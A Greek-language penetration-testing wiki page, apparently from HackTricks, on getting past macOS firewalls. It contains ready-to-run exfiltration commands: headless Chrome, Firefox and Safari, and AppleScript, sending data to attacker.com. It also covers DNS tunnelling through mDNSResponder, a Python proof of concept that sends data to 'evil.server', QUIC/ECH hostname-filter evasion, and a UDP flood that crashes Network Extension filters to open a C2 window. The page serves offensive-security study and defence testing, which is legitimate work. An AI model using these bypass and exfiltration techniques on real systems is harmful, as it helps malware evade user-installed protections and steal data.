# Παράκαμψη Firewalls στο macOS

{{#include ../../banners/hacktricks-training.md}}

## Τεχνικές που έχουν εντοπιστεί

Οι παρακάτω τεχνικές έχουν βρεθεί ότι λειτουργούν σε ορισμένες εφαρμογές firewall του macOS.

### Κατάχρηση ονομάτων whitelist

- Για παράδειγμα, εκτελέστε το malware με ονόματα γνωστών διεργασιών του macOS, όπως το **`launchd`**

### Synthetic Click

- Αν το firewall ζητήσει άδεια από τον χρήστη, κάντε το malware να **κάνει κλικ στο allow**

### **Χρήση binaries υπογεγραμμένων από την Apple**

- Όπως το **`curl`**, αλλά και άλλα, όπως το **`whois`**

### Γνωστά domains της Apple

Το firewall μπορεί να επιτρέπει συνδέσεις σε γνωστά domains της Apple, όπως τα **`apple.com`** ή **`icloud.com`**. Επίσης, το iCloud μπορεί να χρησιμοποιηθεί ως C2.

### Generic Bypass

Μερικές ιδέες για να δοκιμάσετε να παρακάμψετε firewalls

### Έλεγχος επιτρεπόμενης κίνησης

Η γνώση της επιτρεπόμενης κίνησης θα σας βοηθήσει να εντοπίσετε πιθανά whitelisted domains ή ποιες εφαρμογές επιτρέπεται να έχουν πρόσβαση σε αυτά
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusing DNS

Στο macOS μια διεργασία **δεν επικοινωνεί** απευθείας με τον DNS server. Η επίλυση ονομάτων διαμεσολαβείται μέσω **XPC** από το **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), ένα system daemon υπογεγραμμένο από την Apple, επομένως κάθε lookup στο μηχάνημα εγκαταλείπει το host ως traffic **από το `mDNSResponder`** αντί από τη διεργασία που το ζήτησε. Ως εκ τούτου, τα firewalls τείνουν να εμπιστεύονται αυτό το daemon χωρίς όρους — η απόρριψή του θα διέκοπτε την επίλυση ονομάτων για ολόκληρο το σύστημα.<sup>[[1]](#references)</sup>

Αυτό καθιστά το DNS ένα κανάλι που παραμένει ανοιχτό ακόμη και όταν το firewall μπλοκάρει τα ίδια τα sockets του malware:<sup>[[1]](#references)</sup>

1. Το malware προσπαθεί να συνδεθεί στο `evil.com`. Η **δική του** outbound σύνδεση ελέγχεται από το firewall και **μπλοκάρεται**.
2. Αντί γι' αυτό, το malware ζητά από το `mDNSResponder` να κάνει **resolve** το `evil.com`, μέσω XPC.
3. Το firewall εξετάζει το query, βλέπει ως originator τον trusted resolver που είναι υπογεγραμμένος από την Apple και το **επιτρέπει**.
4. Το query φτάνει στον DNS server — και αν ο attacker εκτελεί τον authoritative server για το `evil.com`, ελέγχει και τα δύο άκρα της ανταλλαγής.

Εφόσον ο attacker κατέχει αυτό το zone, δεν χρειάζεται ποτέ κάποια «σύνδεση»: τα δεδομένα διακινούνται κρυφά μέσα στα **queried labels** (π.χ. `<encoded-chunk>.evil.com`) και οι εντολές επιστρέφουν μέσα στα **answer records** (TXT, A, CNAME…), κάτι που αποτελεί κλασικό DNS tunnelling μέσω μιας πλήρως whitelisted διεργασίας.

Οποιαδήποτε unprivileged διεργασία μπορεί να οδηγήσει απευθείας το daemon, γεγονός που αποτελεί έναν εύκολο τρόπο επιβεβαίωσης ότι το path είναι ανοιχτό:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Μέσω Browser apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Μέσω process injections

Αν μπορείς να **κάνεις inject κώδικα σε ένα process** που επιτρέπεται να συνδεθεί σε οποιονδήποτε server, θα μπορούσες να παρακάμψεις τις προστασίες του firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Πρόσφατες ευπάθειες παράκαμψης του macOS firewall (2023-2025)

### Παράκαμψη του Web content filter (Screen Time) – **CVE-2024-44206**
Τον Ιούλιο του 2024, η Apple διόρθωσε ένα critical bug στο Safari/WebKit, το οποίο προκαλούσε δυσλειτουργία στο system-wide “Web content filter” που χρησιμοποιείται από τους γονικούς ελέγχους του Screen Time.
Ένα specially crafted URI (για παράδειγμα, με double URL-encoded “://”) δεν αναγνωρίζεται από το Screen Time ACL, αλλά γίνεται αποδεκτό από το WebKit, με αποτέλεσμα το request να αποστέλλεται χωρίς filtering. Επομένως, οποιοδήποτε process μπορεί να ανοίξει ένα URL (συμπεριλαμβανομένου sandboxed ή unsigned code) μπορεί να αποκτήσει πρόσβαση σε domains που έχουν αποκλειστεί ρητά από τον χρήστη ή από ένα MDM profile.<sup>[[2]](#references)</sup>

Practical test (un-patched system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Bug στη σειρά των κανόνων του Packet Filter (PF) στις πρώιμες εκδόσεις του macOS 14 “Sonoma”
Κατά τον κύκλο beta του macOS 14, η Apple εισήγαγε μια παλινδρόμηση στο userspace wrapper γύρω από το **`pfctl`**.
Οι κανόνες που προστέθηκαν με τη λέξη-κλειδί `quick` (η οποία χρησιμοποιείται από πολλά VPN kill-switches) αγνοούνταν σιωπηρά, προκαλώντας traffic leaks ακόμη και όταν ένα VPN/firewall GUI εμφάνιζε την ένδειξη *blocked*. Το bug επιβεβαιώθηκε από αρκετούς VPN vendors και διορθώθηκε στο RC 2 (build 23A344).

Γρήγορος έλεγχος για leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Κατάχρηση Apple-signed helper services (legacy – pre-macOS 11.2)
Πριν από το macOS 11.2, το **`ContentFilterExclusionList`** επέτρεπε σε περίπου 50 Apple binaries, όπως τα **`nsurlsessiond`** και το App Store, να παρακάμπτουν όλα τα socket-filter firewalls που υλοποιούνταν με το Network Extension framework (LuLu, Little Snitch κ.λπ.).
Το malware μπορούσε απλώς να εκκινήσει μια excluded process —ή να injectάρει code σε αυτή— και να διοχετεύσει τη δική του traffic μέσω του socket που ήταν ήδη allowed. Η Apple αφαίρεσε πλήρως τη λίστα εξαιρέσεων στο macOS 11.2, αλλά η technique παραμένει relevant σε systems που δεν μπορούν να αναβαθμιστούν.<sup>[[3]](#references)</sup>

Παράδειγμα proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH για παράκαμψη των domain filters του Network Extension (macOS 12+)
Οι NEFilter Packet/Data Providers βασίζονται στα TLS ClientHello SNI/ALPN. Με **HTTP/3 over QUIC (UDP/443)** και **Encrypted Client Hello (ECH)**, το SNI παραμένει κρυπτογραφημένο, το NetExt δεν μπορεί να αναλύσει τη ροή και οι κανόνες hostname συχνά αποτυγχάνουν με fail-open, επιτρέποντας σε malware να επικοινωνήσει με αποκλεισμένα domains χωρίς να αγγίξει το DNS.<sup>[[5]](#references)</sup>

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Αν το QUIC/ECH είναι ακόμη ενεργοποιημένο, αυτό αποτελεί μια εύκολη διαδρομή παράκαμψης του hostname-filter.

### macOS 15 “Sequoia” αστάθεια του Network Extension (2024–2025)
Οι πρώιμες εκδόσεις 15.0/15.1 προκαλούν crash στα φίλτρα τρίτων του **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne κ.λπ.). Όταν το φίλτρο κάνει restart, το macOS απορρίπτει τους flow rules του και πολλά προϊόντα αποτυγχάνουν σε fail-open. Η δημιουργία χιλιάδων σύντομων UDP flows στο φίλτρο (ή η επιβολή QUIC/ECH) μπορεί να προκαλεί επανειλημμένα το crash και να αφήνει ένα παράθυρο για C2/exfil, ενώ το GUI εξακολουθεί να εμφανίζει ότι το firewall εκτελείται.<sup>[[4]](#references)</sup>

Γρήγορη αναπαραγωγή (ασφαλές lab box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Συμβουλές εργαλείων για σύγχρονο macOS

1. Επιθεωρήστε τους τρέχοντες κανόνες PF που δημιουργούν τα GUI firewalls:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Enumerate binaries που διαθέτουν ήδη το entitlement *outgoing-network* (χρήσιμο για piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Κάντε programmatically register το δικό σας Network Extension content filter σε Objective-C/Swift.
Ένα minimal rootless PoC που προωθεί πακέτα σε ένα local socket είναι διαθέσιμο στον source code του **LuLu** του Patrick Wardle.

## Αναφορές

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Δημιουργία και παραβίαση macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Το Apple web content filter bypass επιτρέπει unrestricted access σε blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Η Apple αφαιρεί macOS feature που επέτρεπε σε εφαρμογές να παρακάμπτουν την ασφάλεια του Firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out μετά το macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Χρησιμοποιήστε network protection για να αποτρέψετε συνδέσεις του macOS σε κακόβουλα sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
